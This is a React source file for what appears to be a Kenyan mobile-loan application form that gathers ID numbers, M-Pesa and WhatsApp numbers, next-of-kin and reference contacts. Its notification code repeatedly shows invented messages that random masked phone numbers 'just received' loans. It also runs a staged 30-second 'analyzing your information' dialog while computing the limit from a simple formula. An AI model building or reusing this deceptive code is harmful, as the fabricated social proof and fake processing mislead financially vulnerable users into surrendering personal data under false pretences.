import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { useNavigate } from "react-router-dom";
import { FileText, Loader2, Sparkles, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { toast } from "sonner";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";

const Application = () => {
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast: shadcnToast } = useToast();

  useEffect(() => {
    // Generate random Kenyan phone number with masking
    const generateMaskedPhone = () => {
      const prefix = "+254 7";
      const lastDigits = Math.floor(Math.random() * 1000).toString().padStart(3, "0");
      return `${prefix}** *** ${lastDigits}`;
    };

    // Generate random loan amount within our range
    const generateLoanAmount = () => {
      const min = 3450;
      const max = 14600;
      return Math.floor(Math.random() * (max - min + 1) + min);
    };

    // Show loan notification
    const showLoanNotification = () => {
      const phone = generateMaskedPhone();
      const amount = generateLoanAmount();
      
      toast.success(
        `${phone} just received KSh ${amount.toLocaleString()}!`,
        {
          icon: <CheckCircle2 className="w-5 h-5 text-primary" />,
          duration: 5000,
          position: "top-right",
        }
      );
    };

    // Slower random intervals (8-15 seconds)
    const intervals = [8000, 10000, 12000, 15000];
    
    // Schedule next notification
    const scheduleNext = () => {
      const randomInterval = intervals[Math.floor(Math.random() * intervals.length)];
      setTimeout(() => {
        showLoanNotification();
        scheduleNext();
      }, randomInterval);
    };

    // Start the notification cycle after initial delay
    const initialTimeout = setTimeout(() => {
      showLoanNotification();
      scheduleNext();
    }, 3000);

    return () => clearTimeout(initialTimeout);
  }, []);

  const [formData, setFormData] = useState({
    fullName: "",
    idNumber: "",
    whatsappNumber: "",
    mpesaNumber: "",
    nextOfKinName: "",
    nextOfKinContact: "",
    incomeLevel: "",
    employmentStatus: "",
    occupation: "",
    hasExistingLoan: "",
    contactPersonName: "",
    contactPersonPhone: "",
    loanReason: "",
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate required fields
    if (!formData.fullName || !formData.idNumber || !formData.whatsappNumber || !formData.mpesaNumber ||
        !formData.nextOfKinName || !formData.nextOfKinContact || !formData.incomeLevel || 
        !formData.employmentStatus || !formData.occupation || !formData.hasExistingLoan ||
        !formData.contactPersonName || !formData.contactPersonPhone) {
      shadcnToast({
        title: "Incomplete Form",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    // Validate phone numbers
    const phoneRegex = /^(254|0)[17]\d{8}$/;
    if (!phoneRegex.test(formData.whatsappNumber)) {
      shadcnToast({
        title: "Invalid WhatsApp Number",
        description: "Please enter a valid Kenyan phone number",
        variant: "destructive",
      });
      return;
    }

    if (!phoneRegex.test(formData.mpesaNumber)) {
      shadcnToast({
        title: "Invalid M-Pesa Number",
        description: "Please enter a valid Kenyan phone number",
        variant: "destructive",
      });
      return;
    }

    if (!phoneRegex.test(formData.nextOfKinContact)) {
      shadcnToast({
        title: "Invalid Next of Kin Contact",
        description: "Please enter a valid Kenyan phone number",
        variant: "destructive",
      });
      return;
    }

    if (!phoneRegex.test(formData.contactPersonPhone)) {
      shadcnToast({
        title: "Invalid Contact Person Phone",
        description: "Please enter a valid Kenyan phone number",
        variant: "destructive",
      });
      return;
    }

    // Validate ID number
    if (formData.idNumber.length < 6 || formData.idNumber.length > 10) {
      shadcnToast({
        title: "Invalid ID Number",
        description: "ID Number must be 6-10 digits",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    // Calculate loan limit based on income and employment status
    let baseLoan = 0;
    
    // Base loan calculation by income level
    switch(formData.incomeLevel) {
      case "below-20k":
        baseLoan = 3450;
        break;
      case "20k-50k":
        baseLoan = 7000;
        break;
      case "50k-100k":
        baseLoan = 11000;
        break;
      case "above-100k":
        baseLoan = 14600;
        break;
    }
    
    // Adjust by employment status
    let loanLimit = baseLoan;
    switch(formData.employmentStatus) {
      case "employed":
        loanLimit = Math.floor(baseLoan * 1.2); // 20% boost
        break;
      case "self-employed":
        loanLimit = Math.floor(baseLoan * 1.1); // 10% boost
        break;
      case "student":
        loanLimit = Math.floor(baseLoan * 0.7); // 30% reduction
        break;
      case "unemployed":
        loanLimit = Math.floor(baseLoan * 0.5); // 50% reduction
        break;
    }
    
    // Store application data
    localStorage.setItem("helaApplication", JSON.stringify(formData));
    localStorage.setItem("helaLoanLimit", loanLimit.toString());

    // Simulate processing time
    setTimeout(() => {
      setIsLoading(false);
      navigate("/loan-limit");
    }, 30000); // 30 seconds
  };

  return (
    <div className="min-h-screen bg-gradient-soft py-8 px-4">
      <div className="container max-w-2xl mx-auto">
        <Card className="shadow-card">
          <CardHeader className="text-center">
            <div className="w-16 h-16 bg-primary/10 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <FileText className="w-8 h-8 text-primary" />
            </div>
            <CardTitle className="text-2xl">Loan Application</CardTitle>
            <CardDescription>
              Fill in your details to apply for a loan
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Personal Information */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg">Personal Information</h3>
                
                <div className="space-y-2">
                  <Label htmlFor="fullName">Full Name *</Label>
                  <Input
                    id="fullName"
                    placeholder="John Doe"
                    value={formData.fullName}
                    onChange={(e) => setFormData({ ...formData, fullName: e.target.value.slice(0, 100) })}
                    required
                    maxLength={100}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="idNumber">ID Number *</Label>
                  <Input
                    id="idNumber"
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="12345678"
                    value={formData.idNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                      setFormData({ ...formData, idNumber: value });
                    }}
                    required
                    maxLength={10}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="whatsappNumber">WhatsApp Number *</Label>
                  <Input
                    id="whatsappNumber"
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="0712345678"
                    value={formData.whatsappNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 12);
                      setFormData({ ...formData, whatsappNumber: value });
                    }}
                    required
                    maxLength={12}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="mpesaNumber">Registered M-Pesa Number *</Label>
                  <Input
                    id="mpesaNumber"
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="0712345678"
                    value={formData.mpesaNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 12);
                      setFormData({ ...formData, mpesaNumber: value });
                    }}
                    required
                    maxLength={12}
                  />
                </div>
              </div>

              {/* Next of Kin */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg">Next of Kin</h3>
                
                <div className="space-y-2">
                  <Label htmlFor="nextOfKinName">Full Name *</Label>
                  <Input
                    id="nextOfKinName"
                    placeholder="Jane Doe"
                    value={formData.nextOfKinName}
                    onChange={(e) => setFormData({ ...formData, nextOfKinName: e.target.value.slice(0, 100) })}
                    required
                    maxLength={100}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="nextOfKinContact">Contact Number *</Label>
                  <Input
                    id="nextOfKinContact"
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="0723456789"
                    value={formData.nextOfKinContact}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 12);
                      setFormData({ ...formData, nextOfKinContact: value });
                    }}
                    required
                    maxLength={12}
                  />
                </div>
              </div>

              {/* Financial Information */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg">Financial Information</h3>
                
                <div className="space-y-2">
                  <Label htmlFor="employmentStatus">Employment Status *</Label>
                  <Select 
                    value={formData.employmentStatus}
                    onValueChange={(value) => setFormData({ ...formData, employmentStatus: value })}
                    required
                  >
                    <SelectTrigger>
                      <SelectValue placeholder="Select employment status" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="employed">Employed</SelectItem>
                      <SelectItem value="self-employed">Self-Employed</SelectItem>
                      <SelectItem value="student">Student</SelectItem>
                      <SelectItem value="unemployed">Unemployed</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="incomeLevel">Income Level *</Label>
                  <Select 
                    value={formData.incomeLevel}
                    onValueChange={(value) => setFormData({ ...formData, incomeLevel: value })}
                    required
                  >
                    <SelectTrigger>
                      <SelectValue placeholder="Select income range" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="below-20k">Below KES 20,000</SelectItem>
                      <SelectItem value="20k-50k">KES 20,000 - 50,000</SelectItem>
                      <SelectItem value="50k-100k">KES 50,000 - 100,000</SelectItem>
                      <SelectItem value="above-100k">Above KES 100,000</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="occupation">Occupation *</Label>
                  <Input
                    id="occupation"
                    placeholder="e.g., Teacher, Business Owner"
                    value={formData.occupation}
                    onChange={(e) => setFormData({ ...formData, occupation: e.target.value.slice(0, 100) })}
                    required
                    maxLength={100}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="hasExistingLoan">Do you have another existing loan? *</Label>
                  <Select 
                    value={formData.hasExistingLoan}
                    onValueChange={(value) => setFormData({ ...formData, hasExistingLoan: value })}
                    required
                  >
                    <SelectTrigger>
                      <SelectValue placeholder="Select an option" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="yes">Yes</SelectItem>
                      <SelectItem value="no">No</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              {/* Contact Person */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg">Contact Person</h3>
                
                <div className="space-y-2">
                  <Label htmlFor="contactPersonName">Name *</Label>
                  <Input
                    id="contactPersonName"
                    placeholder="Reference name"
                    value={formData.contactPersonName}
                    onChange={(e) => setFormData({ ...formData, contactPersonName: e.target.value.slice(0, 100) })}
                    required
                    maxLength={100}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="contactPersonPhone">Phone Number *</Label>
                  <Input
                    id="contactPersonPhone"
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="0734567890"
                    value={formData.contactPersonPhone}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 12);
                      setFormData({ ...formData, contactPersonPhone: value });
                    }}
                    required
                    maxLength={12}
                  />
                </div>
              </div>

              {/* Optional */}
              <div className="space-y-4">
                <h3 className="font-semibold text-lg">Additional Information</h3>
                
                <div className="space-y-2">
                  <Label htmlFor="loanReason">Reason for Loan (Optional)</Label>
                  <Textarea
                    id="loanReason"
                    placeholder="Tell us why you need this loan..."
                    value={formData.loanReason}
                    onChange={(e) => setFormData({ ...formData, loanReason: e.target.value.slice(0, 500) })}
                    rows={3}
                    maxLength={500}
                  />
                </div>
              </div>

              <Button 
                type="submit" 
                variant="cute" 
                className="w-full" 
                size="lg"
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Calculating Your Loan Limit...
                  </>
                ) : (
                  "Submit Application"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>

        <Dialog open={isLoading} onOpenChange={() => {}}>
          <DialogContent className="sm:max-w-md [&>button]:hidden">
            <DialogHeader>
              <div className="w-20 h-20 bg-gradient-to-br from-primary/20 to-primary/10 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                <Sparkles className="w-10 h-10 text-primary animate-spin" style={{ animationDuration: '3s' }} />
              </div>
              <DialogTitle className="text-center text-2xl">
                ✨ Calculating Your Loan Limit
              </DialogTitle>
              <DialogDescription className="text-center space-y-3 pt-2">
                <p className="text-base font-medium text-foreground">
                  Please don't exit this page!
                </p>
                <p className="text-sm">
                  We're analyzing your information to provide you with the best personalized loan offer...
                </p>
                <div className="flex items-center justify-center gap-2 pt-4">
                  <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                  <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                  <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                </div>
              </DialogDescription>
            </DialogHeader>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};

export default Application;
